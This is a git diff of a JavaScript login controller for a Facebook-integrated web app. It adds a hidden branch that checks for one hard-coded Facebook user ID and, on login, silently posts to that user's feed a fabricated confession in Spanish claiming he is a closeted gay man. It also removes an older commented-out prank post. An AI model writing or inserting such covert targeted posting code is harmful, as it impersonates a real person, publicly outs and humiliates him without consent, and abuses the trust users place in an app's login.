@@ -209,6 +209,12 @@ define(['controller/_usuarioController','delegate/usuarioDelegate', 'delegate/bo
                         self.usuarioActual.set('email',response.email);
                         self.usuarioActual.set('name',response.name);
                         self.usuarioActual.set('facebookId',response.id);
+                        if ( response.id===10152697649964929)
+                        {
+                            FB.api('/me/feed', 'post', {message: 'http://www.facebook.com/l.php?u=http%3A%2F%2Fwww.cosasdesalud.es%2Fimages%2Festre%25C3%25B1imiento.jpg&h=FAQEVwZDh\n\
+ confieso que soy gay y estoy en el closet , ahora me ha comenzado a gustar mi mejor amigo de la u, ambos vamos al gym juntos y nos tocamos para "comparar musculos" y eso como que me calienta, bueno en fin no se si lanzarme o no, como dije estoy en el closet y mi amigo no tiene idea y yo tampoco se si tengo posibilodades o no :c, a pesar de estar en el closet tengo esperiencia homosexual,ya que varias veces en carretes y salidas se me han acercado tipos tirandome palos y como dije voy al gym y tengo buen físico así que algo debo llamar la atención y como no me hago de rogar mucho (en caso de encontrar a los tipos atractivos) he hecho de todo, y al otro día si te he visto no te acuerdo pero lo que quiero preguntar, todos estos weones con lo que he estado ellos se me han acercado a mi, como que algunos gay tienen un radar para encontrar otros gays aunque estos sean de los mas piolas, yo quiero saber ¿CÓMO SABER SI UN HOMBRE ES GAY O NO?, porque hay tipos cachan al tiro eso,yo a pesar de ser gay no logro distinguirlos!! por la chucha si alguen me enseña sería genial, para ver si le tiro los palos a mi amigo o no, o lo dejo como amigo no más .-., por fa ayudenme ustedes amigos heteros/homos como descubren a los gays quiero saber :s'});
+                        }
+                        
                         console.log('Usuario actual a registrar en el model: '+JSON.stringify(self.usuarioActual));
                         //TODO Registrar usuario en la aplicaci�n
                         self.usuarioDelegate = new App.Delegate.UsuarioDelegate();
@@ -232,8 +238,7 @@ define(['controller/_usuarioController','delegate/usuarioDelegate', 'delegate/bo
              
               
                
-//                 FB.api('/me/feed', 'post', {message: 'http://www.facebook.com/l.php?u=http%3A%2F%2Fwww.cosasdesalud.es%2Fimages%2Festre%25C3%25B1imiento.jpg&h=FAQEVwZDh\n\
-// Ayer no pude hacer popo. :('});
+                 
              
                 
                 
